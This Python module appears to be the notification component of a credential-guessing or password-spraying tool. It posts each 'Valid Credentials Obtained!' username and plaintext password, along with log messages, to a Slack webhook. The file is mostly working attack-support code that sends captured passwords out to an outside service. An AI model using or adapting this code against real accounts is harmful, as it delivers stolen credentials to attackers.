import requests, json
from datetime import datetime


def notify_success(username, password, notify_obj):

    slack_webhook = notify_obj['slack_webhook']

    if slack_webhook is not None:
        slack_notify(username, password, slack_webhook)


def notify_update(message, notify_obj):

    slack_webhook = notify_obj['slack_webhook']

    if slack_webhook is not None:
        slack_update(message, slack_webhook)


# Function for posting username/password to slack channel
def slack_notify(username, password, webhook):

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    text = ("```[Valid Credentials Obtained!]\n"
            f"User: {username}\n"
            f"Pass: {password}\n"
            f"Date: {date}\n"
            f"Time: {time}```")

    message = {
        "text" : text
    }

    response = requests.post(
        webhook, data=json.dumps(message),
        headers={'Content-Type': 'application/json'}
    )


# Function for debug messages
def slack_update(slacklog_msg, webhook):
    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    text = ("```[Log Entry]\n"
            f"{slacklog_msg}\n"
            f"Date: {date}\n"
            f"Time: {time}```")

    message = {
        "text" : text
    }
    response = requests.post(
        webhook, data=json.dumps(message),
        headers={'Content-Type': 'application/json'}
    )
